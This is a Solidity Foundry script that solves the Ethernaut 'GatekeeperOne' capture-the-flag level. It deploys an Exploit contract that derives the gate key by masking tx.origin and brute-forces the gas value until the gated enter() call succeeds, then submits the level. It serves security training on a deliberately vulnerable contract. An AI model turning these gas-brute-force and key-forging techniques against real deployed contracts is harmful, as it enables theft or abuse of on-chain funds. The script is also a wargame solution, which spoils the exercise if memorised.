// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {GatekeeperOne} from "src/13/GatekeeperOne.sol";
import {GatekeeperOneFactory} from "src/13/GatekeeperOneFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";
import {console, Test} from "forge-std/Test.sol";

contract GatekeeperOneExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL13_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new GatekeeperOneFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract
        Exploit exploit = new Exploit(GatekeeperOne(instance));
        exploit.exploitEnterFunction();

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}



contract Exploit {
    GatekeeperOne instance;

    constructor(GatekeeperOne _instance) {
        instance = _instance;
    }

    function exploitEnterFunction() external {
        // first requirement: `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
        // the 4 less important bytes equal to the 2 less important bytes => mask = 0x0000FFFF
        // second requirement: `uint32(uint64(_gateKey)) != uint64(_gateKey)
        // the less important 8 bytes of the input must be different compared to the less important 4 bytes
        // <=> So we need to make 0x00000000001111 be != 0xXXXXXXXX00001111
        // The first four bytes remain unchanged, we can update the most important bytes to any combination
        // One of which is 0xFFFFFFFF0000FFFF (but any of 0xFF0FFFFF0000FFFF, 0xF000FFFF0000FFFF .... would work)
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & bytes8(0xFFFFFFFF0000FFFF);
        // try to estimate the correct gas that would trigger the function
        for (uint256 i = 0; i <= 8191; ++i) {
            try instance.enter{gas: (8191 * 10) + i}(key) {
                console.log("passed with gas ->", (8191 * 10) + i);
                break;
            } catch {}
        }
    }
}